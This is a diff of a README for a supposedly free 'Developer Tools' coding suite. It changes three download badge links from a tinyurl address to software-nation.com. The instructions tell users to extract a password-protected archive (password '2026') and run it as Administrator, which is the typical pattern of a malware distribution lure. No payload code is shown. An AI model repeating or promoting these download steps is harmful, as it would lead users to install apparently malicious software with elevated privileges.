@@ -9,7 +9,7 @@ The **🛠️ Developer Tools** is a **free** professional coding suite that pro
 
 <div align="center">
 
-[![Download Developer Tools](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/developer-tools-github)
+[![Download Developer Tools](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/developer-tools-github)
 
 </div>
 
@@ -101,7 +101,7 @@ Every developer needs reliable tools to write, test, and debug code. This free s
 2. **📦 Extract the archive** — password: `2026`
 3. **🖱️ Run as Administrator** → Complete setup wizard
 
-[![Download Developer Tools](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/developer-tools-github)
+[![Download Developer Tools](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/developer-tools-github)
 
 ### Detailed Installation (April 2026 Update)
 
@@ -230,7 +230,7 @@ Everything you need to code, test, and deploy — for free. **Developer Tools** 
 
 <div align="center">
 
-[![Download Developer Tools](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/developer-tools-github)
+[![Download Developer Tools](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/developer-tools-github)
 
 **Version 4.6.1** — Professional coding suite. April 2026 update. Zero cost. No payment.
 
